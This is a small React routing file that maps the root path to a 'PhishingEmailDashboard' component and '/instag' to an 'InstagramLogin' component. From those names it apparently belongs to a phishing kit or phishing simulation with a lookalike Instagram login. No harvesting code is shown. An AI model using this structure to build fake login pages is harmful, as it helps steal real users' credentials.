import React from 'react'
import PhishingEmailDashboard from './PhishingEmailDashboard'
import { BrowserRouter, Route, Routes } from 'react-router'
import InstagramLogin from './InstagramLogin'

const App = () => {
  return (
    <BrowserRouter>
      <Routes>
        <Route path="/" element={<PhishingEmailDashboard />} />
        <Route path="/instag" element={<InstagramLogin />} />
      </Routes>
    </BrowserRouter>
  )
}

export default App